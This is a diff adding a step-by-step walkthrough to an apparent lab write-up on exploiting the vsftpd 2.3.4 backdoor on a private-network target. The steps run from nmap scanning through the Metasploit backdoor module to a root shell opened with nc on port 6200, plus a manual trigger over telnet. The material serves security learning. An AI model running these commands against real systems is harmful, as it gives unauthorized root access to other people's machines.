@@ -47,4 +47,56 @@ manually using telnet and nc, gaining a deeper understanding of how the exploit 
 This exercise taught me the importance of following the correct methodology — always starting 
 with reconnaissance using nmap before moving to exploitation.
 
-## Technical
+## Technical Walkthrough
+
+**Step 1 — Verify connectivity**
+```bash
+ping 192.168.50.101
+```
+
+**Step 2 — Reconnaissance**
+```bash
+nmap -sV 192.168.50.101
+```
+vsftpd 2.3.4 identified on port 21.
+
+**Step 3 — Load the exploit module**
+```bash
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+**Step 4 — Set target and run**
+```bash
+set RHOSTS 192.168.50.101
+run
+```
+
+**Step 5 — Connect to the backdoor shell**
+```bash
+nc 192.168.50.101 6200
+whoami
+```
+Result: `root`
+
+**Step 6 — Create the directory**
+```bash
+mkdir /test_metasploit
+ls /
+```
+
+**Step 7 — Manual exploit (optional)**
+
+Terminal 1:
+```bash
+telnet 192.168.50.101 21
+USER ciao:)
+PASS anypassword
+```
+Terminal 2 (immediately after):
+```bash
+nc 192.168.50.101 6200
+whoami
+```
+Result: `root`
